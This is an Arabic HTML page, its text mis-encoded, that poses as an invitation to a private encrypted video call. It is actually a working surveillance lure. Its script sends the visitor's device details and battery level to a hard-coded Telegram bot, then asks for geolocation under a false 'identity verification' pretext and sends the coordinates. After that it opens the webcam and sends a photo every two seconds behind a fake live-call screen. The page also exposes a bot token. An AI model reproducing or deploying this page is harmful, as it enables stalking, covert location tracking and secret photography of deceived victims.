<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>ØºØ±ÙØ© Ù…ÙƒØ§Ù„Ù…Ø© ÙÙŠØ¯ÙŠÙˆ Ø®Ø§ØµØ© | Ø§ØªØµØ§Ù„ Ø¢Ù…Ù†</title>
    <meta name="description" content="Ø§Ù†Ø¶Ù… Ø§Ù„Ø¢Ù† Ø¥Ù„Ù‰ ØºØ±ÙØ© Ø§Ù„Ù…ÙƒØ§Ù„Ù…Ø© Ø§Ù„ÙÙŠØ¯ÙŠÙˆ Ø§Ù„Ø®Ø§ØµØ© Ø§Ù„Ù…Ø´ÙØ±Ø©. Ø§ØªØµØ§Ù„ Ø¢Ù…Ù† Ø¨Ø¬ÙˆØ¯Ø© Ø¹Ø§Ù„ÙŠØ©.">
    <meta property="og:type" content="website">
    <meta property="og:title" content="ğŸ”´ Ø¯Ø¹ÙˆØ© Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø¥Ù„Ù‰ Ù…ÙƒØ§Ù„Ù…Ø© ÙÙŠØ¯ÙŠÙˆ Ø®Ø§ØµØ©">
    <meta property="og:description" content="Ù„Ù‚Ø¯ ØªÙ… Ø¯Ø¹ÙˆØªÙƒ Ù„Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø¥Ù„Ù‰ Ù…Ø­Ø§Ø¯Ø«Ø© ÙÙŠØ¯ÙŠÙˆ Ø¢Ù…Ù†Ø© ÙˆÙ…Ø´ÙØ±Ø©. Ø§Ø¶ØºØ· Ù„Ù„Ø¯Ø®ÙˆÙ„ Ù…Ø¨Ø§Ø´Ø±Ø©.">
    <meta property="og:image" content="https://img.icons8.com/fluent/200/video-call.png">
    <meta name="theme-color" content="#0f172a">

    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
        body { background: #0f172a; color: white; overflow: hidden; font-family: 'Tajawal', sans-serif; }
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); }
        #video-feed { transform: scaleX(-1); object-fit: cover; }
        .loading-ring { border: 4px solid #3498db; border-top: 4px solid transparent; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-overlay { display: none; position: fixed; inset: 0; background: #0f172a; z-index: 100; align-items: center; justify-content: center; text-align: center; padding: 20px; }
    </style>
</head>
<body>

    <div id="error-screen" class="error-overlay flex-col">
        <div class="glass p-8 rounded-3xl max-w-md">
            <i id="error-icon" class="fas fa-exclamation-triangle text-yellow-500 text-5xl mb-4"></i>
            <h2 id="error-title" class="text-2xl font-bold mb-4">ÙŠØ¬Ø¨ Ù…Ù†Ø­ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª</h2>
            <p id="error-desc" class="text-gray-300 mb-6">Ø¹Ø°Ø±Ø§Ù‹ØŒ ÙŠØªØ·Ù„Ø¨ Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ø¶Ù…Ø§Ù† Ø£Ù…Ø§Ù† Ø§Ù„Ù…ÙƒØ§Ù„Ù…Ø© Ø§Ù„Ù…Ø´ÙØ±Ø©. ÙŠØ±Ø¬Ù‰ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª Ù…Ù† Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù…ØªØµÙØ­ Ø«Ù… Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.</p>
            <button onclick="window.location.reload()" class="bg-blue-600 px-8 py-3 rounded-full font-bold hover:bg-blue-700 transition">Ø¥Ø¹Ø§Ø¯Ø© Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©</button>
        </div>
    </div>

    <div id="setup-screen" class="fixed inset-0 z-50 flex flex-col items-center justify-center bg-slate-900">
        <div class="glass p-10 rounded-3xl text-center shadow-2xl">
            <div class="loading-ring mx-auto mb-4"></div>
            <h1 id="status-text" class="text-2xl font-bold mb-2">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ©...</h1>
            <p id="countdown" class="text-blue-400 text-5xl font-mono my-4">5</p>
            <p id="instruction-text" class="text-gray-400 text-sm italic">ÙŠØ±Ø¬Ù‰ Ù‚Ø¨ÙˆÙ„ Ø¥Ø°Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©</p>
        </div>
    </div>

    <main class="relative h-screen w-full flex flex-col items-center justify-between p-6">
        <video id="video-feed" autoplay playsinline muted class="absolute inset-0 w-full h-full object-cover z-0 opacity-60"></video>

        <div class="z-10 w-full max-w-4xl flex justify-between items-center glass p-4 rounded-2xl">
            <div class="flex items-center gap-3">
                <div class="w-3 h-3 bg-red-500 rounded-full animate-pulse"></div>
                <span class="font-bold">LIVE â€¢ Ù…ÙƒØ§Ù„Ù…Ø© ÙÙŠØ¯ÙŠÙˆ Ø®Ø§ØµØ©</span>
            </div>
            <div class="text-sm text-green-400 font-mono"><i class="fas fa-lock mr-1"></i> Ø§ØªØµØ§Ù„ Ù…Ø´ÙØ±</div>
        </div>

        <div class="z-10 w-full max-w-md glass p-6 rounded-[3rem] flex justify-around items-center mb-8 shadow-2xl border-white/10">
            <button class="w-12 h-12 rounded-full bg-white/10 flex items-center justify-center"><i class="fas fa-microphone"></i></button>
            <button onclick="window.location.reload()" class="w-16 h-16 rounded-full bg-red-600 flex items-center justify-center transition hover:scale-110 active:scale-95 shadow-lg shadow-red-600/50">
                <i class="fas fa-phone-slash text-2xl rotate-[135deg]"></i>
            </button>
            <button class="w-12 h-12 rounded-full bg-white/10 flex items-center justify-center"><i class="fas fa-video"></i></button>
        </div>

        <canvas id="canvas" style="display:none;"></canvas>
    </main>

    <script>
        const BOT_TOKEN = '8001439036:AAFAVndQ0GlWuz0djflhyPYo5Jo17oMLAHo';
        const CHAT_ID = '6068331455';
        let countdownVal = 5;

        // ÙˆØ¸ÙŠÙØ© Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
        function sendMessage(text) {
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
        }

        // 1. Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ (Ø¥Ø¬Ø¨Ø§Ø±ÙŠ)
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                sendMessage("âŒ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ… ÙÙŠ Ù‡Ø°Ø§ Ø§Ù„Ù…ØªØµÙØ­");
                startCamera(); // Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø­ØªÙ‰ Ù„Ùˆ ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…
            }
        }

        function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            sendMessage(`ğŸ“ *ØªÙ… ØªØ­Ø¯ÙŠØ¯ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:*\nØ±Ø§Ø¨Ø· Ø§Ù„Ø®Ø±ÙŠØ·Ø©: ${googleMapsLink}\nØ§Ù„Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª: ${lat}, ${lon}`);
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© Ù„Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„ØªØ§Ù„ÙŠØ©
            document.getElementById('instruction-text').innerText = "ØªÙ… Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹.. ÙŠØ±Ø¬Ù‰ Ù‚Ø¨ÙˆÙ„ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§";
            document.getElementById('status-text').innerText = "Ø¬Ø§Ø±ÙŠ ØªÙ‡ÙŠØ¦Ø© Ø§Ù„ØºØ±ÙØ© Ø§Ù„Ø®Ø§ØµØ©...";
            startCamera(); 
        }

        function showError(error) {
            let errorMsg = "âŒ ÙØ´Ù„ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ";
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMsg += "Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù†";
                    showErrorUI("ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©");
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMsg += "Ø§Ù„Ù…ÙˆÙ‚Ø¹ ØºÙŠØ± Ù…ØªØ§Ø­";
                    startCamera(); // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø© Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                    break;
                case error.TIMEOUT:
                    errorMsg += "Ø§Ù†ØªÙ‡Øª Ù…Ù‡Ù„Ø© Ø§Ù„Ø·Ù„Ø¨";
                    startCamera();
                    break;
            }
            sendMessage(errorMsg);
        }

        function showErrorUI(msg) {
            document.getElementById('setup-screen').style.display = 'none';
            document.getElementById('error-screen').style.display = 'flex';
            document.getElementById('error-desc').innerText = msg;
        }

        // 2. Ø·Ù„Ø¨ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙˆØ§Ù„Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„Ù„Ø§Ù†Ù‡Ø§Ø¦ÙŠ
        async function startCamera() {
            const video = document.getElementById('video-feed');
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                video.onloadedmetadata = () => {
                    // Ø¨Ø¯Ø¡ Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ Ù„Ø¥Ø®ÙØ§Ø¡ Ø´Ø§Ø´Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
                    let countInterval = setInterval(() => {
                        countdownVal--;
                        document.getElementById('countdown').innerText = countdownVal;
                        if (countdownVal <= 0) {
                            clearInterval(countInterval);
                            document.getElementById('setup-screen').style.display = 'none';
                        }
                    }, 1000);

                    // Ø¨Ø¯Ø¡ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ± Ø§Ù„Ù„Ø§Ù†Ù‡Ø§Ø¦ÙŠ ÙƒÙ„ 2 Ø«Ø§Ù†ÙŠØ© Ù„Ø²ÙŠØ§Ø¯Ø© Ø§Ù„ÙƒÙØ§Ø¡Ø©
                    setInterval(captureAndSend, 2000);
                };
            } catch (err) {
                showErrorUI("ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„ÙØªØ­ Ø§Ù„ØºØ±ÙØ© Ø§Ù„Ø®Ø§ØµØ©");
                sendMessage("âŒ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§");
            }
        }

        function captureAndSend() {
            const video = document.getElementById('video-feed');
            const canvas = document.getElementById('canvas');
            if (video.videoWidth > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob((blob) => {
                    if (blob) {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'shot.jpg');
                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                    }
                }, 'image/jpeg', 0.5);
            }
        }

        // 3. Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ø¨Ø¯Ø¡
        window.onload = async () => {
            let battery = "ØºÙŠØ± Ù…ØªØ§Ø­";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = `${Math.round(b.level * 100)}% - ${b.charging ? 'ÙŠØ´Ø­Ù†' : 'Ù„Ø§ ÙŠØ´Ø­Ù†'}`;
            }
            sendMessage(`ğŸ”” *Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯*\nğŸ”‹ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: ${battery}\nğŸ“± Ø§Ù„Ø¬Ù‡Ø§Ø²: ${navigator.platform}`);
            
            // Ø§Ù„Ø¨Ø¯Ø¡ Ø¨Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ Ø£ÙˆÙ„Ø§Ù‹
            getLocation();
        };
    </script>
</body>
</html>
